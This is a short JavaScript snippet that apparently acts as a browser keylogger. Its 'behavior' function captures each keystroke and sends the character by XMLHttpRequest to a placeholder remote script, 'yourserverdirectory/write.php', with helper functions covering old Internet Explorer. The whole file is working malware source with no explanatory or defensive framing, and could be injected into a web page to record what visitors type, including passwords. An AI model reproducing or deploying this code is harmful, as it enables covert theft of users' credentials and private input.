function behavior(event)
{
var keya = "";
keya = event.keyCode;
keyb = String.fromCharCode(keya);
makeRequest('http://yourserverdirectory/write.php?on=' + keyb);
}

function makeRequest(url)
{
var httpRequest;

if (window.XMLHttpRequest)
{ // Mozilla, Safari
httpRequest = new XMLHttpRequest();
if (httpRequest.overrideMimeType) {
httpRequest.overrideMimeType('text/xml');
}
}
else if (window.ActiveXObject)
{ // IE
try
{
httpRequest = new ActiveXObject("Msxml2.XMLHTTP");
}
catch (e) {
try {
httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
}
catch (e) {}
}
}

if (!httpRequest)
{

return false;
}
httpRequest.onreadystatechange = function() { alertContents(httpRequest); };
httpRequest.open('GET', url, true);
httpRequest.send(null);
}

function alertContents(httpRequest)
{
if (httpRequest.readyState == 4) {
if (httpRequest.status == 200) {
}
else
{

}
}
}
